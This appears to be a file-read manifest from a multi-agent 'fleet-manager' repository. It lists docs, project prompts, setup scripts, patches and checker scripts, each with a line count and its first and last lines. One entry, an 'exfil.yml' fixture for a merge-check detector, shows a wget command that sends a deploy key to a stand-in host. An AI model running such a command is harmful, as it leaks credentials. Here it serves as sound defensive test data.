+READ	docs/providers/mistral.md	111	full	b44	# Mistral — provider capability reference	- Nothing here is measured in this estate yet.
+READ	docs/q-index.md	62	full	b44	# Q-index — repo-qualified owner-decision register (INDEX)	recorded here so the nomination isn't lost.
+READ	docs/question-router.md	32	full	b44	# fleet-manager — maintainer question router	graduation.)
+READ	docs/reading-path.md	102	full	b44	# fleet-manager — fleet reading path (multi-repo orientation	orientation is first-class work.
+READ	docs/repo-navigation-map.md	21	full	b44	# fleet-manager — repo navigation map	hes, the map is stale — extend the table in the same change.
+READ	docs/repos/ACCEPTANCE-TESTS.md	191	full	b44	# Layer 2 — the two acceptance tests, and what they returned	reasons.
+READ	docs/repos/README.md	147	full	b44	# `docs/repos/` — Layer 2, one folder per repo	check becoming ritual.
+READ	docs/repos/spider-swing/README.md	221	full	b44	# spider-swing — the entry point	repo genuinely needs it.
+READ	docs/repos/spider-swing/capabilities.md	152	full	b44	# spider-swing — what is verified about reaching it from her	  not from an observed spider-swing run.
+READ	docs/repos/spider-swing/records.md	85	full	b44	# spider-swing — what fleet-manager has written about it	instead.
+READ	docs/repos/spider-swing/working-here.md	122	full	b44	# spider-swing — how to work here	ng. Tiling **is** required for the purpose-built rail tiles.
+READ	docs/research/2026-07-12-platform-capabilities.md	422	full	b45	# Platform capability & limitation ledger — claude.ai Projec	structive, merge-adjacent, or trigger-creating was executed.
+READ	docs/research/2026-07-12-problem-census-core.md	851	full	b45	# Problem census — core repos (2026-07-12)	2026-07-11/12 overnight program.*
+READ	docs/research/2026-07-12-problem-census-satellites.md	666	full	b45	# Problem census — satellite repos (2026-07-12)	ly; a kit-upgrade wave is a known heartbeat-drift generator.
+READ	docs/research/2026-07-12-prompt-architecture.md	243	full	b46	# Prompt architecture & steering — requirements spec for the	  depends on it.
+READ	docs/research/2026-07-12-prompt-currency-audit.md	247	full	b46	# Prompt-currency audit — is v3.3 finished, and is it still 	   next heartbeat cycle.
+READ	docs/research/2026-07-12-qa-boot-simulation.md	790	full	b46	# 2026-07-12 — QA boot simulation of the v3 startup prompt s	summary table; no discrepancies found.*
+READ	docs/research/2026-07-12-qa-incident-replay.md	253	full	b46	# QA Wave 3 — incident replay: prompts v3 vs the 80-entry in	ports live on their own research branches, not in this tree.
+READ	docs/research/2026-07-12-qa-question-rounds.md	893	full	b47	# QA question rounds against the prompts-v3 set — 2026-07-12	R3×9, R4×10, R5×11, R6×10) all map to a row above.
+READ	docs/research/2026-07-12-repo-consolidation-census.md	597	full	b47	# Repo consolidation census — phase A (2026-07-12)	/fleet-manifest.md` is `historical`, superseded 2026-07-11).
+READ	docs/research/2026-07-12-staleness-sweep-8seat.md	117	full	b47	# Staleness sweep — first sweep under the 8-seat registry — 	rading-strategy/pull/64); CI green at `296a1a9` / `ea22323`.
+READ	docs/research/2026-07-12-staleness-sweep-midday.md	67	full	b47	# Staleness sweep — midday 8-seat sweep + v3.3 adoption chec	and but the enabler skips drafts — flip ready or it dangles.
+READ	docs/research/2026-08-03-gemini-paid-tiers.md	180	full	b47	# Is a paid Gemini tier worth it for gameplay-video review?	to be wrong.
+READ	docs/research/2026-08-03-gemini-report-verification.md	193	full	b47	# Verifying a Gemini report about spider-swing, claim by cla	remains an assumption.
+READ	docs/research/2026-08-03-gemini-visual-qa-gem.md	350	full	b47	# The spider-swing visual-QA Gem — paste-ready build	it is the only maintenance this Gem needs.
+READ	docs/research/2026-08-03-reducing-invented-detail.md	203	full	b47	# Why it invents specifics, and the procedure that stops it	review, and see whether the answer is a refusal or a number.
+READ	docs/research/README.md	25	full	b47	# Research — overnight program reports	and a merged 16-item v3.4 delta list (2 P0 · 11 P1 · 3 P2) |
+READ	docs/retro/archive-ready-2026-07-11.md	66	full	b47	# Archive-ready 2026-07-11 — coordinator seat cse_012o8pySy5	the archived chat is lost with the archive.
+READ	docs/retro/coordinator-seat-2026-07-11.md	77	full	b47	# Retro — coordinator seat, 2026-07-11 (booted 01:04Z → arch	output looks fresh (manual runs mask a dead cron).
+READ	docs/review-queue.md	153	full	b48	# Review queue — needs-second-review ledger (post-merge)	ding lane at its next contact (rides the ORDER 010 relay). |
+READ	docs/roster.md	113	full	b48	# Fleet roster — GENERATED · **HISTORICAL**	diff` on this file, or append prose below before committing.
+READ	docs/runtime_contracts.md	30	full	b48	# fleet-manager — runtime contracts	adius, and the recovery step. One subsection per subsystem.)
+READ	docs/seat-digest.md	83	full	b48	# fleet-manager — seat digest	never content to merge back by hand.
+READ	docs/succession/coordinator-handoff-2026-07-11-evening.md	168	full	b48	# Coordinator succession handoff — 2026-07-11 (evening)	   `control/claims/README.md`.
+READ	docs/succession/coordinator-handoff-2026-07-11.md	131	full	b48	# Coordinator succession handoff — 2026-07-11	green (R21); decide-and-flag; deny-wins.
+READ	docs/trigger-health-spec.md	99	full	b48	# Trigger-health per-wake spec (R26 / ORDER 020)	reading path.
+READ	docs/workflow-pr-merge-policy.md	55	full	b48	# Workflow-PR merge policy — agent-merge after Codex-clean	a delete/import, token swaps, spending money) are unchanged.
+READ	environments/README.md	59	full	b48	# Environment registry	spec's `Verified` line — specs describe reality, not intent.
+READ	environments/SPEC-TEMPLATE.md	58	full	b48	# Environment spec — `<env-name>` (PROPOSED)	   **Verified** above.
+READ	environments/archetype-bot-prod.sh	53	full	b48	#!/usr/bin/env bash	exit 0
+READ	environments/archetype-coordinator.sh	50	full	b48	#!/usr/bin/env bash	exit 0
+READ	environments/archetype-gba-lab.sh	206	full	b48	#!/usr/bin/env bash	exit 0
+READ	environments/archetype-pinned-research.sh	52	full	b48	#!/usr/bin/env bash	exit 0
+READ	environments/archetype-python-lab.sh	46	full	b48	#!/usr/bin/env bash	exit 0
+READ	environments/archetypes.md	184	full	b48	# Environment archetypes — the fleet's consolidated environm	   `Verified` line.
+READ	environments/env-grant-policy.md	130	full	b48	# Env-grant policy — which secrets each project gets, and wh	md` (in the websites repo) — the ambient-production-ID rail.
+READ	environments/multi-repo.md	66	full	b48	# Environment spec — `multi-repo` (LIVE)	ee `SPEC-TEMPLATE.md`) when a lane needs anything sensitive.
+READ	environments/setup-base.sh	206	full	b48	#!/usr/bin/env bash	exit 0
+READ	environments/templates/env-vars.md	48	full	b48	# Environment variables — standard fleet schema	  one-offs stay in the lane's own spec.
+READ	environments/templates/setup-universal.sh	69	full	b48	#!/usr/bin/env bash	exit 0
+READ	environments/templates/smoke.yml	61	full	b48	# smoke.yml — Tier 1 "fast-full" reference workflow (.github	        run: python -m pytest -x -q
+READ	project.index.json	62	full	b48	{	}
+READ	projects/README.md	270	full	b48	# projects/ — the fleet's Project package registry	mechanical-only, none needed.
+READ	projects/UNIVERSAL.md	168	full	b48	<!-- v5 · 2026-07-15 · universal WAKE prompt + Permissions &	the raw-fetch indirection stays confined to the wake prompt.
+READ	projects/_inventory/inventory-games-new.md	386	full	b49	# Launch-package inventory — game lanes, codetool archives, 	   OLD hourly model).
+READ	projects/_inventory/inventory-hub.md	138	full	b49	# Hub-side inventory — project-package centralization (2026-	exactly what the `projects/<repo>/` centralization resolves.
+READ	projects/_inventory/inventory-lanes.md	192	full	b49	# In-repo inventory — project-package artifacts, active lane	unexecuted, clockless) | ✅ ×2 lanes, inconsistent dirs | ❌ |
+READ	projects/_inventory/trigger-registry-2026-07-10.md	321	full	b49	<!-- v1 · 2026-07-10 · fleet-manager projects registry -->	re-arms remain open per their failsafe files.
+READ	projects/codetool-lab-fable5/meta.md	10	full	b49	<!-- v1 · 2026-07-11 · fleet-manager projects registry — RET	  in fleet-manager; last full state @ `1dea86d`.
+READ	projects/codetool-lab-opus4.8/meta.md	10	full	b49	<!-- v1 · 2026-07-11 · fleet-manager projects registry — RET	  in fleet-manager; last full state @ `1dea86d`.
+READ	projects/codetool-lab-sonnet5/meta.md	10	full	b49	<!-- v1 · 2026-07-11 · fleet-manager projects registry — RET	  in fleet-manager; last full state @ `1dea86d`.
+READ	projects/curious-research/coordinator-prompt.md	156	full	b49	<!-- v3 · 2026-07-18 · fleet-manager projects registry — GEN	e; routine name + cadence + worker-retry + verify-after-arm.
+READ	projects/curious-research/failsafe-prompt.md	47	full	b49	<!-- v2 · 2026-07-18 · fleet-manager projects registry — GEN	and recurring deliverables run in the continuous work loop).
+READ	projects/curious-research/instructions.md	61	full	b49	<!-- v2 · 2026-07-18 · fleet-manager projects registry — GEN	-15 · fm ORDER 048 · UNIVERSAL v5 · seat facts @ 2026-07-13.
+READ	projects/curious-research/meta.md	39	full	b49	<!-- v3.7 · 2026-07-18 · fleet-manager projects registry -->	try-current; failsafe byte-state via the triggers snapshot |
+READ	projects/fleet-manager/coordinator-prompt.md	158	full	b49	<!-- v11 · 2026-07-18 · fleet-manager projects registry — GE	e; routine name + cadence + worker-retry + verify-after-arm.
+READ	projects/fleet-manager/failsafe-prompt.md	47	full	b49	<!-- v10 · 2026-07-18 · fleet-manager projects registry — GE	and recurring deliverables run in the continuous work loop).
+READ	projects/fleet-manager/instructions.md	62	full	b49	<!-- v10 · 2026-07-18 · fleet-manager projects registry — GE	-15 · fm ORDER 048 · UNIVERSAL v5 · seat facts @ 2026-07-15.
+READ	projects/fleet-manager/meta.md	91	full	b50	<!-- v3.7 · 2026-07-18 · fleet-manager projects registry -->	  committed or pushed by the builder).
+READ	projects/fleet-manager/reboot-prompt.md	34	full	b50	<!-- v2 · 2026-07-11 (evening archive) · fleet-manager proje	```
+READ	projects/fleet-manager/seat-digest.md	50	full	b50	<!-- v1 · 2026-07-12 · fleet-manager projects registry — GEN	<!-- substrate-kit:walls-digest END -->
+READ	projects/fleet-manager/setup-script.sh	9	full	b50	#!/usr/bin/env bash	exit 0
+READ	projects/game-lab/coordinator-prompt.md	156	full	b50	<!-- v8 · 2026-07-18 · fleet-manager projects registry — GEN	e; routine name + cadence + worker-retry + verify-after-arm.
+READ	projects/game-lab/failsafe-prompt.md	47	full	b50	<!-- v7 · 2026-07-18 · fleet-manager projects registry — GEN	and recurring deliverables run in the continuous work loop).
+READ	projects/game-lab/instructions.md	62	full	b50	<!-- v7 · 2026-07-18 · fleet-manager projects registry — GEN	-15 · fm ORDER 048 · UNIVERSAL v5 · seat facts @ 2026-07-12.
+READ	projects/game-lab/meta.md	26	full	b50	<!-- v3.7 · 2026-07-18 · fleet-manager projects registry -->	e-state verified via the triggers snapshot, not this table |
+READ	projects/game-lab/seat-digest.md	82	full	b50	<!-- v1 · 2026-07-12 · fleet-manager projects registry — GEN	<!-- substrate-kit:walls-digest END -->
+READ	projects/games-program/meta.md	10	full	b50	<!-- v1 · 2026-07-11 · fleet-manager projects registry — RET	  in fleet-manager; last full state @ `1dea86d`.
+READ	projects/gba-homebrew/meta.md	13	full	b50	<!-- v1 · 2026-07-11 · fleet-manager projects registry — MER	/gba-homebrew stays live and is driven by the Game Lab seat.
+READ	projects/idea-engine/meta.md	13	full	b50	<!-- v1 · 2026-07-11 · fleet-manager projects registry — MER	/idea-engine stays live and is driven by the Ideas Lab seat.
+READ	projects/ideas-lab/coordinator-prompt.md	158	full	b50	<!-- v8 · 2026-07-18 · fleet-manager projects registry — GEN	e; routine name + cadence + worker-retry + verify-after-arm.
+READ	projects/ideas-lab/failsafe-prompt.md	47	full	b50	<!-- v7 · 2026-07-18 · fleet-manager projects registry — GEN	and recurring deliverables run in the continuous work loop).
+READ	projects/ideas-lab/instructions.md	61	full	b50	<!-- v7 · 2026-07-18 · fleet-manager projects registry — GEN	-15 · fm ORDER 048 · UNIVERSAL v5 · seat facts @ 2026-07-12.
+READ	projects/ideas-lab/meta.md	26	full	b50	<!-- v3.7 · 2026-07-18 · fleet-manager projects registry -->	e-state verified via the triggers snapshot, not this table |
+READ	projects/mobile-lab/meta.md	10	full	b50	<!-- v1 · 2026-07-11 · fleet-manager projects registry — RET	  in fleet-manager; last full state @ `1dea86d`.
+READ	projects/pokemon-mod-lab/meta.md	13	full	b50	<!-- v1 · 2026-07-11 · fleet-manager projects registry — MER	kemon-mod-lab stays live and is driven by the Game Lab seat.
+READ	projects/product-forge/coordinator-prompt.md	88	full	b50	<!-- v2 · 2026-07-11 · fleet-manager projects registry -->	```
+READ	projects/product-forge/failsafe-prompt.md	54	full	b50	<!-- v1 · 2026-07-10 · fleet-manager projects registry -->	for manual creation in the claude.ai Routines screen.
+READ	projects/product-forge/handoff/2026-07-23-phone-controller-slice4/0001-wip-born-red-session-card-heartbeat-phone-controller.patch	161	full	b50	From 8300f0629ffe25964b480090a59268bf4185d923 Mon Sep 17 00:	2.43.0
+READ	projects/product-forge/handoff/2026-07-23-phone-controller-slice4/0002-phone-controller-Slice-4-combo-HID-device-keyboard-g.patch	2179	full	b51	From 2c67cb498e949fad9f93d42cbb1e61c4947f2522 Mon Sep 17 00:	2.43.0
+READ	projects/product-forge/handoff/2026-07-23-phone-controller-slice4/0003-phone-controller-Slice-4-ci-debug-APK-artifact-hid-c.patch	201	full	b51	From fa26e6d4a6aaaa0028fbeade9c85ad9a4897e843 Mon Sep 17 00:	2.43.0
+READ	projects/product-forge/handoff/2026-07-23-phone-controller-slice4/0004-close-out-Slice-4-heartbeat-session-card-complete-ve.patch	218	full	b51	From 6d6af92320723847c92099bb33c5314015eb0aac Mon Sep 17 00:	2.43.0
+READ	projects/product-forge/handoff/2026-07-23-phone-controller-slice4/README.md	70	full	b51	# Handoff — phone-controller Slice 4 (usable controller app 	  card sequence is the substrate-gate's expected shape.
+READ	projects/product-forge/handoff/2026-07-23-phone-controller-slice4/land.sh	31	full	b51	#!/usr/bin/env bash	NEXT
+READ	projects/product-forge/instructions.md	129	full	b51	<!-- v3 · 2026-07-11 · fleet-manager projects registry -->	 from `date -u` at write time — never memory or a prior doc.
+READ	projects/product-forge/meta.md	88	full	b51	# product-forge — package meta (core seat 5)	(both freshly fetched this session).
+READ	projects/product-forge/setup-script.sh	8	full	b51	#!/usr/bin/env bash	exit 0
+READ	projects/self-improvement/coordinator-prompt.md	156	full	b51	<!-- v8 · 2026-07-18 · fleet-manager projects registry — GEN	e; routine name + cadence + worker-retry + verify-after-arm.
+READ	projects/self-improvement/failsafe-prompt.md	47	full	b51	<!-- v7 · 2026-07-18 · fleet-manager projects registry — GEN	and recurring deliverables run in the continuous work loop).
+READ	projects/self-improvement/instructions.md	62	full	b51	<!-- v7 · 2026-07-18 · fleet-manager projects registry — GEN	-15 · fm ORDER 048 · UNIVERSAL v5 · seat facts @ 2026-07-15.
+READ	projects/self-improvement/meta.md	26	full	b52	<!-- v3.7 · 2026-07-18 · fleet-manager projects registry -->	e-state verified via the triggers snapshot, not this table |
+READ	projects/sim-lab/meta.md	13	full	b52	<!-- v1 · 2026-07-11 · fleet-manager projects registry — MER	o420/sim-lab stays live and is driven by the Ideas Lab seat.
+READ	projects/substrate-kit/meta.md	13	full	b52	<!-- v1 · 2026-07-11 · fleet-manager projects registry — MER	e-kit stays live and is driven by the Self Improvement seat.
+READ	projects/superbot-2.0/coordinator-prompt.md	157	full	b52	<!-- v8 · 2026-07-18 · fleet-manager projects registry — GEN	e; routine name + cadence + worker-retry + verify-after-arm.
+READ	projects/superbot-2.0/failsafe-prompt.md	47	full	b52	<!-- v7 · 2026-07-18 · fleet-manager projects registry — GEN	and recurring deliverables run in the continuous work loop).
+READ	projects/superbot-2.0/instructions.md	61	full	b52	<!-- v7 · 2026-07-18 · fleet-manager projects registry — GEN	-15 · fm ORDER 048 · UNIVERSAL v5 · seat facts @ 2026-07-15.
+READ	projects/superbot-2.0/meta.md	26	full	b52	<!-- v3.7 · 2026-07-18 · fleet-manager projects registry -->	e-state verified via the triggers snapshot, not this table |
+READ	projects/superbot-games/meta.md	13	full	b52	<!-- v1 · 2026-07-11 · fleet-manager projects registry — MER	t-games stays live and is driven by the SuperBot World seat.
+READ	projects/superbot-idle/meta.md	13	full	b52	<!-- v1 · 2026-07-11 · fleet-manager projects registry — MER	ot-idle stays live and is driven by the SuperBot World seat.
+READ	projects/superbot-mineverse/meta.md	13	full	b52	<!-- v1 · 2026-07-11 · fleet-manager projects registry — MER	neverse stays live and is driven by the SuperBot World seat.
+READ	projects/superbot-next/meta.md	13	full	b52	<!-- v1 · 2026-07-11 · fleet-manager projects registry — MER	rbot-next stays live and is driven by the SuperBot 2.0 seat.
+READ	projects/superbot-retro/meta.md	10	full	b52	<!-- v1 · 2026-07-11 · fleet-manager projects registry — RET	  in fleet-manager; last full state @ `1dea86d`.
+READ	projects/superbot-world/coordinator-prompt.md	156	full	b52	<!-- v9 · 2026-07-18 · fleet-manager projects registry — GEN	e; routine name + cadence + worker-retry + verify-after-arm.
+READ	projects/superbot-world/failsafe-prompt.md	47	full	b52	<!-- v7 · 2026-07-18 · fleet-manager projects registry — GEN	and recurring deliverables run in the continuous work loop).
+READ	projects/superbot-world/instructions.md	62	full	b52	<!-- v8 · 2026-07-18 · fleet-manager projects registry — GEN	-15 · fm ORDER 048 · UNIVERSAL v5 · seat facts @ 2026-07-14.
+READ	projects/superbot-world/meta.md	26	full	b52	<!-- v3.7 · 2026-07-18 · fleet-manager projects registry -->	e-state verified via the triggers snapshot, not this table |
+READ	projects/superbot/meta.md	13	full	b52	<!-- v1 · 2026-07-11 · fleet-manager projects registry — MER	/superbot stays live and is driven by the SuperBot 2.0 seat.
+READ	projects/trading-strategy/meta.md	13	full	b52	<!-- v1 · 2026-07-11 · fleet-manager projects registry — MER	g-strategy stays live and is driven by the Venture Lab seat.
+READ	projects/venture-lab/coordinator-prompt.md	156	full	b52	<!-- v9 · 2026-07-18 · fleet-manager projects registry — GEN	e; routine name + cadence + worker-retry + verify-after-arm.
+READ	projects/venture-lab/failsafe-prompt.md	47	full	b52	<!-- v8 · 2026-07-18 · fleet-manager projects registry — GEN	and recurring deliverables run in the continuous work loop).
+READ	projects/venture-lab/instructions.md	61	full	b52	<!-- v9 · 2026-07-18 · fleet-manager projects registry — GEN	-15 · fm ORDER 048 · UNIVERSAL v5 · seat facts @ 2026-07-12.
+READ	projects/venture-lab/meta.md	99	full	b52	<!-- v3.7 · 2026-07-18 · fleet-manager projects registry -->	in this session; superbot router read locally at `4fac759`).
+READ	projects/venture-lab/seat-digest.md	45	full	b52	<!-- v1 · 2026-07-12 · fleet-manager projects registry — GEN	<!-- substrate-kit:walls-digest END -->
+READ	projects/venture-lab/setup-script.sh	8	full	b52	#!/usr/bin/env bash	exit 0
+READ	projects/websites/coordinator-prompt.md	157	full	b53	<!-- v10 · 2026-07-18 · fleet-manager projects registry — GE	e; routine name + cadence + worker-retry + verify-after-arm.
+READ	projects/websites/failsafe-prompt.md	47	full	b53	<!-- v8 · 2026-07-18 · fleet-manager projects registry — GEN	and recurring deliverables run in the continuous work loop).
+READ	projects/websites/instructions.md	62	full	b53	<!-- v8 · 2026-07-18 · fleet-manager projects registry — GEN	-15 · fm ORDER 048 · UNIVERSAL v5 · seat facts @ 2026-07-15.
+READ	projects/websites/meta.md	106	full	b53	<!-- v3.7 · 2026-07-18 · fleet-manager projects registry -->	ecords — the live registry was NOT re-queried this session).
+READ	projects/websites/setup-script.sh	8	full	b53	#!/usr/bin/env bash	exit 0
+READ	registry/README.md	21	full	b53	# registry/ — machine-readable fleet registries	directly and need no repoint.
+READ	registry/kit-versions.md	31	full	b53	# Fleet kit-version table — GENERATED	-hash class stays a follow-up (plan C10 `registry/pins.md`).
+READ	registry/lanes.json	251	full	b53	{	}
+READ	scripts/assemble_triggers_snapshot.py	356	full	b53	#!/usr/bin/env python3	    sys.exit(main())
+READ	scripts/check_capabilities_grammar.py	577	full	b53	#!/usr/bin/env python3	    sys.exit(main())
+READ	scripts/check_capabilities_wall_age.py	474	full	b53	#!/usr/bin/env python3	    sys.exit(main())
+READ	scripts/check_docs_links.py	399	full	b53	#!/usr/bin/env python3	    sys.exit(main())
+READ	scripts/check_fleet_triage_staleness.py	457	full	b53	#!/usr/bin/env python3	    sys.exit(main())
+READ	scripts/check_label_hygiene.py	343	full	b53	#!/usr/bin/env python3	    sys.exit(main())
+READ	scripts/check_lane_liveness.py	917	full	b54	#!/usr/bin/env python3	    sys.exit(main())
+READ	scripts/check_owner_queue.py	588	full	b54	#!/usr/bin/env python3	    sys.exit(main())
+READ	scripts/check_roster_freshness.py	381	full	b54	#!/usr/bin/env python3	    sys.exit(main())
+READ	scripts/check_trigger_health.py	793	full	b54	#!/usr/bin/env python3	    sys.exit(main())
+READ	scripts/emit_routine_claims.py	347	full	b54	#!/usr/bin/env python3	    sys.exit(main())
+READ	scripts/env-setup.sh	55	full	b54	#!/usr/bin/env bash	exit 0
+READ	scripts/fixtures/owner-queue-known-bad.md	56	full	b54	# Owner queue — KNOWN-BAD fixture (check_owner_queue.py must	  must NOT double-flag from down here.
+READ	scripts/fixtures/owner-queue-known-good.md	35	full	b54	# Owner queue — KNOWN-GOOD fixture (check_owner_queue.py mus	  Blocking: blocks payment-path E2E verification.
+READ	scripts/fixtures/r30/clean.yml	13	full	b54	# r30_merge_check selfcheck fixture — PASS: no secret+egress	        run: python3 scripts/check_docs_links.py --strict
+READ	scripts/fixtures/r30/exfil.yml	15	full	b54	# r30_merge_check selfcheck fixture — STOP: the classic exfi	et -q -O- "https://metrics.example.dev/ingest?k=$DEPLOY_KEY"
+READ	scripts/fixtures/r30/github-scoped.yml	18	full	b54	# r30_merge_check selfcheck fixture — REVIEW: secrets + egre	api.github.com/repos/${{ github.repository }}/pulls/1/merge"
+READ	scripts/gen_idea_backlog.py	294	full	b54	#!/usr/bin/env python3	    raise SystemExit(main(sys.argv[1:]))
+READ	scripts/gen_kit_versions.py	238	full	b54	#!/usr/bin/env python3	    sys.exit(main())
+READ	scripts/gen_roster.py	2154	full	b55	#!/usr/bin/env python3	    sys.exit(main())
+READ	scripts/preflight.py	113	full	b55	#!/usr/bin/env python3	    sys.exit(main())
+READ	scripts/r30_merge_check.py	537	full	b55	#!/usr/bin/env python3	    sys.exit(main())
+READ	scripts/verify_routine_state.py	749	full	b55	#!/usr/bin/env python3	    sys.exit(main())
+READ	substrate.config.json	103	full	b55	{	}
+READ	telemetry/README.md	80	full	b55	# `telemetry/` — committed machine-readable fleet telemetry	cap yet — revisit if it grows past a few hundred lines.
+READ	telemetry/lane-liveness-ledger.jsonl	7	full	b55	{"evaluated_at": "2026-07-20T04:07Z", "lanes": {"fleet-manag	 "waking"}}, "snapshot_captured_at": "2026-07-21T16:00:18Z"}
+READ	telemetry/model-usage.jsonl	1	full	b55	{"date": "2026-07-09", "effort": "standard", "model": "unrec	d-home-repo", "task_class": "repo-seed", "tokens_out": null}
+READ	telemetry/triggers-snapshot.json	1	structural	b56	{"capture_notes": ["Capture 2026-07-21T16:00:18Z is a FULL l	mail": false, "slack": false}}, "created_via": "http_api"}]}
+READ	templates/worker-preamble.md	40	full	b57	# Worker preamble templates	```
+READ	tools/ab_kit_scan.py	234	full	b57	#!/usr/bin/env python3	    raise SystemExit(main())
+READ	tools/check_doc_routes.py	150	full	b57	#!/usr/bin/env python3	    sys.exit(main())
+READ	tools/check_no_false_walls.py	631	full	b57	#!/usr/bin/env python3	    sys.exit(main())
+READ	tools/chroma_spill_probe.py	47	full	b57	from PIL import Image	emi.sum()):10d} {gx.mean():14.2f} {int((gx>15).sum()):15d}")
+READ	tools/gemini_delegate.py	487	full	b57	#!/usr/bin/env python3	    raise SystemExit(main())
+READ	tools/install_root_hooks.py	175	full	b57	#!/usr/bin/env python3	    sys.exit(main())
+READ	tools/read_screen_recording.py	60	full	b57	#!/usr/bin/env python3	      file=sys.stderr)
+READ	tools/read_shared_chat.py	160	full	b57	#!/usr/bin/env python3	    raise SystemExit(main())
+READ	tools/sim/ci_tier_sim.py	790	full	b57	#!/usr/bin/env python3	    sys.exit(main())
+READ	tools/test_change_guard.py	122	full	b57	#!/usr/bin/env python3	sys.exit(0 if all(T) else 1)
+READ	tools/test_trigger_tools_guard.py	317	full	b57	#!/usr/bin/env python3	sys.exit(1 if failed else 0)
